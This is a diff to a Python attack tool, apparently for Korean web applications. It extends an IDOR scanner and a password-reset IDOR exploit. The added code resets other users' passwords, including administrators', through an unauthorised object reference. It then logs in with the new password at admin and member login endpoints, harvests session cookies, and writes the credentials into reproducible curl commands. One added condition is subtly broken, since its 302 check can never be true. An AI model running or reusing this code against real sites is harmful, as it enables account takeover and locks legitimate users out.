@@ -58,6 +58,11 @@ class IdorHit:
     evidence_snippet: str = ""
     severity: str = "high"         # critical / high / medium
     description: str = ""
+    # Zero-Hallucination: 실제 HTTP 증거 필드
+    status_code: int = 0           # 반드시 실제 응답 코드
+    test_url: str = ""             # 테스트한 실제 URL
+    curl_command: str = ""         # 재현 가능한 curl 명령어
+    evidence_level: str = "VERIFIED"  # VERIFIED / INFERRED
 
 
 @dataclass
@@ -361,6 +366,14 @@ class IdorScanner:
             # 스니펫 추출
             snippet = r.text[:300].replace("\n", " ").strip()
 
+            # Zero-Hallucination: curl 재현 명령어 생성
+            curl_cmd = f"curl -sk '{test_url}'"
+            if self.session.cookies:
+                cookie_str = "; ".join(
+                    f"{k}={v}" for k, v in self.session.cookies.items()
+                )
+                curl_cmd = f"curl -sk -H 'Cookie: {cookie_str}' '{test_url}'"
+
             hit = IdorHit(
                 url=base_url,
                 param=param,
@@ -375,6 +388,10 @@ class IdorScanner:
                     if pii_found
                     else f"no={i} 접근 시 응답 크기 변화 ({baseline_size}B → {len(r.text)}B)"
                 ),
+                status_code=r.status_code,
+                test_url=test_url,
+                curl_command=curl_cmd,
+                evidence_level="VERIFIED",  # 실제 HTTP 응답 확인됨
             )
             result.hits.append(hit)
             self.log(
@@ -457,28 +474,118 @@ class PasswordResetIdor:
                 timeout=self.timeout,
             )
 
-            success = r_post.status_code == 200 and (
+            # 1차 체크: 폼 제출 응답
+            submit_ok = r_post.status_code == 200 and (
                 "success" in r_post.text.lower()
                 or "완료" in r_post.text
                 or "수정" in r_post.text
-                or len(r_post.text) > 1000
+                or r_post.status_code == 302
+            )
+
+            # ── Zero-Hallucination: 실제 로그인으로 검증 ─────────────────────
+            login_verified = False
+            session_cookie = ""
+            login_status_code = 0
+            login_response_snippet = ""
+
+            if submit_ok and username != "unknown":
+                login_verified, session_cookie, login_status_code, login_response_snippet = \
+                    self._verify_login(username, pw)
+
+            actual_success = submit_ok and login_verified
+
+            # 로그인 검증 curl 명령어
+            login_url = self.target + "/ko_admin/login_proc.php"
+            verify_curl = (
+                f"curl -sk -c /tmp/cookie.txt -X POST '{login_url}' "
+                f"--data-raw 'admin_id={username}&admin_password={pw}'"
             )
 
             self.log(
                 f"[IDOR PW] no={target_no} ({username}) → "
-                f"{'✅ 성공' if success else '❌ 실패'}"
+                f"폼제출={'✅' if submit_ok else '❌'} | "
+                f"로그인검증={'✅' if login_verified else '❌'}"
             )
 
             return {
-                "success": success,
+                "success": actual_success,
+                "submit_ok": submit_ok,
+                "login_verified": login_verified,
                 "target_no": target_no,
                 "username": username,
                 "new_password": pw,
                 "url": view_url,
+                "session_cookie": session_cookie,
+                "login_status_code": login_status_code,
+                "login_response_snippet": login_response_snippet[:200],
+                "verify_curl": verify_curl,
+                # Zero-Hallucination 메타데이터
+                "evidence_level": "VERIFIED" if actual_success else "INFERRED",
             }
 
         except Exception as e:
-            return {"success": False, "error": str(e)}
+            return {"success": False, "error": str(e), "evidence_level": "INFERRED"}
+
+    def _verify_login(
+        self, username: str, password: str
+    ) -> tuple[bool, str, int, str]:
+        """
+        비밀번호 재설정 후 실제 로그인 시도.
+        Returns: (verified, session_cookie, status_code, response_snippet)
+
+        Zero-Hallucination 핵심 — 로그인 성공 쿠키 없으면 VERIFIED 불가.
+        """
+        login_urls = [
+            self.target + "/ko_admin/login_proc.php",
+            self.target + "/admin/login_proc.php",
+            self.target + "/member/login_proc.php",
+        ]
+        success_signs = ["로그아웃", "logout", "dashboard", "대시보드", "관리자"]
+
+        for login_url in login_urls:
+            try:
+                s = requests.Session()
+                s.verify = False
+                s.headers.update({"User-Agent": "Mozilla/5.0"})
+
+                # 관리자 로그인 시도
+                r = s.post(
+                    login_url,
+                    data={
+                        "admin_id": username,
+                        "admin_password": password,
+                        "rand_auth_": "0",
+                    },
+                    timeout=10,
+                    allow_redirects=True,
+                )
+                cookie_str = "; ".join(f"{k}={v}" for k, v in s.cookies.items())
+                verified = bool(cookie_str) and any(
+                    sign.lower() in r.text.lower() for sign in success_signs
+                )
+                if verified:
+                    return True, cookie_str, r.status_code, r.text[:200]
+            except Exception:
+                pass
+
+        # 일반 사용자 로그인도 시도
+        try:
+            member_login_url = self.target + "/member/member.html"
+            s = requests.Session()
+            s.verify = False
+            r = s.post(
+                member_login_url,
+                data={"id": username, "password": password, "mode": "login_proc"},
+                timeout=10,
+                allow_redirects=True,
+            )
+            cookie_str = "; ".join(f"{k}={v}" for k, v in s.cookies.items())
+            if cookie_str and r.status_code in (200, 302):
+                return True, cookie_str, r.status_code, r.text[:200]
+        except Exception:
+            pass
+
+        return False, "", 0, ""
 
     def reset_admin_password(
         self,
